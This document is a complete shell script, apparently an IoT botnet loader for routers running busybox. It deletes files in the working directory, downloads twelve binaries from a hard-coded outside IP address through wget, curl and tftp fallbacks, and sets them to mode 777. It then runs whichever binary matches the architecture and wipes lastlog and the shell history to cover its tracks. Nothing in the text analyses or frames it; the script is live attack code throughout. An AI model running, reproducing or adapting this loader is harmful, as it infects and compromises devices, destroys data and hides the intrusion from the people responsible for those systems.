#!/bin/sh

# Delete any current files, because not all routers have much storage space
rm -f * || busybox rm -f *

# Wget/cURL our binaries
wget -q http://185.22.172.238/1 || curl -s -O http://185.22.172.238/1 || busybox wget -q http://185.22.172.238/1 || busybox curl -s -O http://185.22.172.238/1 || busybox tftp -r 1 -g 185.22.172.238 || busybox tftp 185.22.172.238 -c get 1
wget -q http://185.22.172.238/2 || curl -s -O http://185.22.172.238/2 || busybox wget -q http://185.22.172.238/2 || busybox curl -s -O http://185.22.172.238/2 || busybox tftp -r 2 -g 185.22.172.238 || busybox tftp 185.22.172.238 -c get 2
wget -q http://185.22.172.238/3 || curl -s -O http://185.22.172.238/3 || busybox wget -q http://185.22.172.238/3 || busybox curl -s -O http://185.22.172.238/3 || busybox tftp -r 3 -g 185.22.172.238 || busybox tftp 185.22.172.238 -c get 3
wget -q http://185.22.172.238/4 || curl -s -O http://185.22.172.238/4 || busybox wget -q http://185.22.172.238/4 || busybox curl -s -O http://185.22.172.238/4 || busybox tftp -r 4 -g 185.22.172.238 || busybox tftp 185.22.172.238 -c get 4
wget -q http://185.22.172.238/5 || curl -s -O http://185.22.172.238/5 || busybox wget -q http://185.22.172.238/5 || busybox curl -s -O http://185.22.172.238/5 || busybox tftp -r 5 -g 185.22.172.238 || busybox tftp 185.22.172.238 -c get 5
wget -q http://185.22.172.238/6 || curl -s -O http://185.22.172.238/6 || busybox wget -q http://185.22.172.238/6 || busybox curl -s -O http://185.22.172.238/6 || busybox tftp -r 6 -g 185.22.172.238 || busybox tftp 185.22.172.238 -c get 6
wget -q http://185.22.172.238/7 || curl -s -O http://185.22.172.238/7 || busybox wget -q http://185.22.172.238/7 || busybox curl -s -O http://185.22.172.238/7 || busybox tftp -r 7 -g 185.22.172.238 || busybox tftp 185.22.172.238 -c get 7
wget -q http://185.22.172.238/8 || curl -s -O http://185.22.172.238/8 || busybox wget -q http://185.22.172.238/8 || busybox curl -s -O http://185.22.172.238/8 || busybox tftp -r 8 -g 185.22.172.238 || busybox tftp 185.22.172.238 -c get 8
wget -q http://185.22.172.238/9 || curl -s -O http://185.22.172.238/9 || busybox wget -q http://185.22.172.238/9 || busybox curl -s -O http://185.22.172.238/9 || busybox tftp -r 9 -g 185.22.172.238 || busybox tftp 185.22.172.238 -c get 9
wget -q http://185.22.172.238/10 || curl -s -O http://185.22.172.238/10 || busybox wget -q http://185.22.172.238/10 || busybox curl -s -O http://185.22.172.238/10 || busybox tftp -r 10 -g 185.22.172.238 || busybox tftp 185.22.172.238 -c get 10
wget -q http://185.22.172.238/11 || curl -s -O http://185.22.172.238/11 || busybox wget -q http://185.22.172.238/11 || busybox curl -s -O http://185.22.172.238/11 || busybox tftp -r 11 -g 185.22.172.238 || busybox tftp 185.22.172.238 -c get 11
wget -q http://185.22.172.238/12 || curl -s -O http://185.22.172.238/12 || busybox wget -q http://185.22.172.238/12 || busybox curl -s -O http://185.22.172.238/12 || busybox tftp -r 11 -g 185.22.172.238 || busybox tftp 185.22.172.238 -c get 12

# Set file permissions
chmod 777 * || busybox chmod 777 *

# Run correct binary for current architecture
./1 || ./2 || ./3 || ./4 || ./5 || ./6 || ./7 || ./8 || ./9 || ./10 || ./11 || ./12

# Delete our files
rm -f * || busybox rm -f *

# Clear up
>/var/log/lastlog
>/etc/lastlog
rm -f ~/.bash_history || busybox rm -f ~/.bash_history
history -c
